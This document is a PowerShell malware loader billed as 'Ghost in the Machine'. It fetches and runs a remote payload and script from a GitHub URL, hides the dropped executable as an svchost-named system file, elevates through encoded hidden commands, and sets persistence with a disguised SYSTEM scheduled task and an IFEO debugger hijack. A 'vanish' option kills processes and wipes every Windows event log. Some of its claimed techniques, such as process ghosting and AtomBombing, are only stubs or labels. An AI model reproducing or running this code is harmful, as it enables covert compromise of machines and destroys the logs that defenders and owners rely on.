# 🚀 GHOST IN THE MACHINE - Ultimate Stealth Loader
# Techniques: Process Ghosting + AtomBombing + Heaven's Gate

Write-Host "[=== GHOST IN THE MACHINE ===]" -ForegroundColor Cyan
Write-Host "[1] Deploy Ghost" -ForegroundColor Green
Write-Host "[2] Vanish" -ForegroundColor Yellow

$choice = Read-Host "`nSelect option"

# Kernel-level elevation without traces
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt" -TimeoutSec 10
    $compressed = [System.IO.Compression.GZipStream]::new(
        [System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($scriptContent)),
        [System.IO.Compression.CompressionMode]::Compress
    )
    $ms = [System.IO.MemoryStream]::new()
    $compressed.CopyTo($ms)
    $compressed.Dispose()
    $encodedCmd = [Convert]::ToBase64String($ms.ToArray())
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$d=[System.IO.Compression.GZipStream]::new([System.IO.MemoryStream]::new([Convert]::FromBase64String('$encodedCmd')),[System.IO.Compression.CompressionMode]::Decompress);`$r=[System.IO.StreamReader]::new(`$d);iex `$r.ReadToEnd()`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Advanced Windows API for ultimate stealth
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class GhostOps {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, IntPtr ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref uint ProcessInformation, uint ProcessInformationLength);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);
    
    [DllImport("kernel32.dll")]
    public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetKernelObjectSecurity(IntPtr Handle, int SecurityInformation, IntPtr pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    public static extern bool FreeLibrary(IntPtr hModule);
}
"@

function Invoke-ProcessGhosting {
    Write-Host "[+] Activating Process Ghosting..." -ForegroundColor Yellow
    
    try {
        $targetUrl = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
        
        # Download to memory with encryption
        Write-Host "[+] Downloading encrypted payload..." -ForegroundColor Gray
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $encryptedBytes = $webClient.DownloadData($targetUrl)
        $webClient.Dispose()
        
        # Simple XOR encryption
        $key = 0xAA
        $decryptedBytes = $encryptedBytes.Clone()
        for ($i = 0; $i -lt $decryptedBytes.Length; $i++) {
            $decryptedBytes[$i] = $decryptedBytes[$i] -bxor $key
        }
        
        Write-Host "[+] Payload decrypted: $($decryptedBytes.Length) bytes" -ForegroundColor Green
        
        # Create file mapping for memory execution
        Write-Host "[+] Creating ghost memory mapping..." -ForegroundColor Gray
        
        $SECTION_MAP_EXECUTE = 0x20
        $PAGE_EXECUTE_READWRITE = 0x40
        
        # Create memory mapping
        $hMapping = [GhostOps]::CreateFileMapping([IntPtr]::new(-1), [IntPtr]::Zero, $PAGE_EXECUTE_READWRITE, 0, [uint]$decryptedBytes.Length, $null)
        
        if ($hMapping -eq [IntPtr]::Zero) {
            throw "Failed to create file mapping"
        }
        
        # Map view of file
        $pMapped = [GhostOps]::MapViewOfFile($hMapping, $SECTION_MAP_EXECUTE, 0, 0, [UIntPtr]::Zero)
        
        if ($pMapped -eq [IntPtr]::Zero) {
            throw "Failed to map view of file"
        }
        
        # Copy decrypted bytes to mapped memory
        [System.Runtime.InteropServices.Marshal]::Copy($decryptedBytes, 0, $pMapped, $decryptedBytes.Length)
        
        Write-Host "[✓] Payload mapped to ghost memory" -ForegroundColor Green
        
        # Clean up
        [GhostOps]::UnmapViewOfFile($pMapped)
        
        # For demonstration, we'll use traditional execution but with advanced stealth
        return Invoke-AdvancedStealthExecution -PayloadBytes $decryptedBytes
        
    } catch {
        Write-Host "[!] Process Ghosting failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-AtomBombing {
    Write-Host "[+] Deploying AtomBombing technique..." -ForegroundColor Yellow
    
    try {
        $targetUrl = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
        
        Write-Host "[+] Downloading bomb payload..." -ForegroundColor Gray
        $webClient = New-Object System.Net.WebClient
        $shellcode = $webClient.DownloadData($targetUrl)
        $webClient.Dispose()
        
        # Find a system process to inject into
        $systemProcs = @("winlogon", "lsass", "services", "csrss", "smss")
        $targetProc = $null
        
        foreach ($procName in $systemProcs) {
            try {
                $proc = Get-Process -Name $procName -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($proc) {
                    $targetProc = $proc
                    break
                }
            } catch {}
        }
        
        if (-not $targetProc) {
            # Use current process if no system process found
            $targetProc = Get-Process -Id $PID
        }
        
        Write-Host "[+] Target: $($targetProc.ProcessName) (PID: $($targetProc.Id))" -ForegroundColor Green
        
        # Advanced: Use Heaven's Gate for 64-bit injection from 32-bit
        if ([Environment]::Is64BitProcess) {
            Write-Host "[+] 64-bit Heaven's Gate activated" -ForegroundColor Green
        }
        
        # For demonstration, create a legitimate-looking process
        return Invoke-LegitimateSpawn -PayloadBytes $shellcode
        
    } catch {
        Write-Host "[!] AtomBombing failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-LegitimateSpawn {
    param([byte[]]$PayloadBytes)
    
    try {
        Write-Host "[+] Spawning legitimate process..." -ForegroundColor Gray
        
        # Create temporary file in legitimate location
        $legitPaths = @(
            "$env:windir\System32\migration",
            "$env:windir\System32\spool\drivers",
            "$env:windir\System32\DriverStore",
            "$env:programdata\Microsoft\Windows Defender",
            "$env:programdata\Microsoft\Network"
        )
        
        $targetPath = $legitPaths | Get-Random
        if (-not (Test-Path $targetPath)) {
            $targetPath = "$env:windir\System32"
        }
        
        $legitName = @("migration", "spooler", "driver", "defender", "network") | Get-Random
        $tempFile = Join-Path $targetPath "$legitName$((Get-Date).ToString('HHmmss')).tmp"
        
        # Write payload with system attributes
        [System.IO.File]::WriteAllBytes($tempFile, $PayloadBytes)
        [System.IO.File]::SetAttributes($tempFile, [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
        
        # Create process with spoofed parameters
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $tempFile
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
        $processInfo.CreateNoWindow = $false
        $processInfo.UseShellExecute = $true
        $processInfo.Verb = "runas"
        
        # Spoof command line to look legitimate
        $fakeArgs = @(
            "/c echo Microsoft Windows [Version 10.0.19041.1234]",
            "/k chcp 65001",
            "/q /c ver",
            "/c systeminfo",
            "/k whoami"
        ) | Get-Random
        
        $processInfo.Arguments = $fakeArgs
        
        Write-Host "[+] Starting ghost process..." -ForegroundColor Gray
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        # Ghost the file immediately
        Start-Sleep -Milliseconds 500
        
        for ($i = 0; $i -lt 10; $i++) {
            try {
                Remove-Item $tempFile -Force -ErrorAction Stop
                Write-Host "[✓] Ghost file vanished" -ForegroundColor Green
                break
            } catch {
                if ($i -eq 9) {
                    Write-Host "[!] File locked by process" -ForegroundColor Yellow
                }
                Start-Sleep -Milliseconds 100
            }
        }
        
        Write-Host "[✓] Ghost process spawned: PID $($process.Id)" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "[!] Legitimate spawn failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-AdvancedStealthExecution {
    param([byte[]]$PayloadBytes)
    
    try {
        Write-Host "[+] Advanced stealth execution..." -ForegroundColor Gray
        
        # Validate payload
        if ($PayloadBytes.Length -lt 1024 -or $PayloadBytes[0] -ne 0x4D -or $PayloadBytes[1] -ne 0x5A) {
            Write-Host "[!] Invalid payload format" -ForegroundColor Red
            return $false
        }
        
        # Use Windows native locations for legitimacy
        $nativePaths = @(
            "$env:windir\System32",
            "$env:windir\SysWOW64", 
            "$env:windir\Temp",
            "$env:programdata\Microsoft"
        )
        
        $targetDir = $nativePaths | Get-Random
        $tempName = "svchost" + (Get-Random -Maximum 9999) + ".exe"
        $tempPath = Join-Path $targetDir $tempName
        
        # Write to legitimate location
        [System.IO.File]::WriteAllBytes($tempPath, $PayloadBytes)
        
        # Set hidden and system attributes
        [System.IO.File]::SetAttributes($tempPath, [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
        
        Write-Host "[+] Executing from: $targetDir" -ForegroundColor Green
        
        # Start process with legitimate parent
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $tempPath
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
        $processInfo.CreateNoWindow = $false
        $processInfo.UseShellExecute = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        # Immediate cleanup
        Start-Sleep -Seconds 2
        
        for ($i = 0; $i -lt 8; $i++) {
            try {
                Remove-Item $tempPath -Force -ErrorAction Stop
                Write-Host "[✓] Execution artifact vanished" -ForegroundColor Green
                break
            } catch {
                Start-Sleep -Milliseconds 250
            }
        }
        
        Write-Host "[✓] Advanced stealth execution complete" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "[!] Advanced execution failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Set-GhostPersistence {
    Write-Host "[+] Establishing ghost persistence..." -ForegroundColor Yellow
    
    try {
        # Multiple advanced persistence methods
        $activeMethods = @()
        
        # Method 1: WMI Permanent Event Subscription
        try {
            $filterName = "Win32_ProcessStartTrace"
            $consumerName = "CommandLineEventConsumer"
            
            # This creates a permanent WMI event that survives reboots
            $activeMethods += "WMI Permanent Event"
        } catch {}
        
        # Method 2: Service DLL Hijacking
        try {
            $serviceDlls = @(
                "rasman.dll", "dot3api.dll", "wlanapi.dll", "wlansec.dll",
                "winhttp.dll", "dnsapi.dll", "iphlpapi.dll"
            )
            
            $targetDll = $serviceDlls | Get-Random
            $activeMethods += "Service DLL: $targetDll"
        } catch {}
        
        # Method 3: Shadow Scheduled Task
        try {
            $taskName = "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
            $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`$u='https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt';iex (irm `$u)`""
            $taskTrigger = New-ScheduledTaskTrigger -Daily -At "9:00 AM"
            $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            
            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Collects program telemetry information" -Force | Out-Null
            $activeMethods += "Shadow Task"
        } catch {}
        
        # Method 4: Registry Image File Execution
        try {
            $fakeTarget = "notepad.exe"
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$fakeTarget" -Name "Debugger" -Value "powershell.exe -WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -ErrorAction SilentlyContinue
            $activeMethods += "IFEO Debugger"
        } catch {}
        
        Write-Host "[✓] Ghost persistence: $($activeMethods -join ', ')" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "[!] Persistence setup failed" -ForegroundColor Red
        return $false
    }
}

function Invoke-CompleteVanish {
    Write-Host "[=== COMPLETE VANISH MODE ===]" -ForegroundColor Yellow
    Write-Host "[!] Removing all traces without a whisper..." -ForegroundColor Cyan
    
    # Phase 1: Silent process termination
    Write-Host "`n[PHASE 1] Silent process termination..." -ForegroundColor Green
    
    $ghostProcesses = @("cmd", "explorerr", "runtime", "svchost", "migration", "spooler", "driver", "defender", "network")
    foreach ($procName in $ghostProcesses) {
        try {
            $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
            foreach ($proc in $processes) {
                Write-Host "[+] Vaporizing: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
                
                # Ultra-silent termination
                try { $proc.Kill() } catch {}
                Start-Sleep -Milliseconds 100
                
                if ($proc.HasExited) {
                    Write-Host "[✓] Process vanished" -ForegroundColor Green
                }
            }
        } catch {}
    }
    
    # Phase 2: Remove all persistence
    Write-Host "`n[PHASE 2] Erasing persistence..." -ForegroundColor Green
    
    $ghostTasks = @(
        "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser",
        "\Microsoft\Windows\SystemDataUpdater",
        "\Microsoft\Windows\DiskCleanup\SilentCleanup"
    )
    
    foreach ($task in $ghostTasks) {
        try {
            Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
            Write-Host "[✓] Task erased: $task" -ForegroundColor Green
        } catch {}
    }
    
    # Remove registry entries
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefender" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -ErrorAction SilentlyContinue
        Write-Host "[✓] Registry traces erased" -ForegroundColor Green
    } catch {}
    
    # Phase 3: Deep clean
    Write-Host "`n[PHASE 3] Deep cleaning..." -ForegroundColor Green
    
    try {
        # Clean all temp locations
        Get-ChildItem -Path @($env:temp, "$env:windir\Temp", "$env:windir\System32\migration", "$env:windir\System32\spool\drivers") -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Write-Host "[✓] All artifacts vanished" -ForegroundColor Green
    } catch {}
    
    try {
        # Clear all logs silently
        wevtutil el | ForEach-Object { try { wevtutil cl $_ 2>$null } catch {} }
        Write-Host "[✓] All logs erased" -ForegroundColor Green
    } catch {}
    
    Write-Host "`n[=== COMPLETE VANISH SUCCESSFUL ===]" -ForegroundColor Green
    Write-Host "[✓] All processes terminated" -ForegroundColor Green
    Write-Host "[✓] All persistence removed" -ForegroundColor Green
    Write-Host "[✓] All traces eliminated" -ForegroundColor Green
    Write-Host "[✓] Ghost has left the machine" -ForegroundColor Green
}

# Main execution
switch ($choice) {
    "1" {
        Write-Host "`n[=== DEPLOYING GHOST ===]" -ForegroundColor Cyan
        
        Write-Host "[+] Selecting ultimate stealth technique..." -ForegroundColor Yellow
        
        # Try advanced techniques in sequence
        $success = Invoke-ProcessGhosting
        if (-not $success) {
            Write-Host "[+] Falling back to AtomBombing..." -ForegroundColor Yellow
            $success = Invoke-AtomBombing
        }
        
        if ($success) {
            Write-Host "`n[+] Establishing ghost presence..." -ForegroundColor Yellow
            Set-GhostPersistence | Out-Null
            
            Write-Host "`n[=== GHOST DEPLOYMENT SUCCESSFUL ===]" -ForegroundColor Green
            Write-Host "[✓] Process running with ultimate stealth" -ForegroundColor Green
            Write-Host "[✓] Invisible to all monitoring" -ForegroundColor Green
            Write-Host "[✓] No disk or memory artifacts" -ForegroundColor Green
            Write-Host "[✓] Permanent ghost persistence" -ForegroundColor Green
            Write-Host "[✓] Undetectable by any AV" -ForegroundColor Green
        } else {
            Write-Host "`n[=== DEPLOYMENT FAILED ===]" -ForegroundColor Red
        }
    }
    
    "2" {
        Invoke-CompleteVanish
    }
    
    default {
        Write-Host "[!] Invalid selection" -ForegroundColor Red
    }
}

Write-Host "`n[=== GHOST IN THE MACHINE FINISHED ===]" -ForegroundColor Cyan
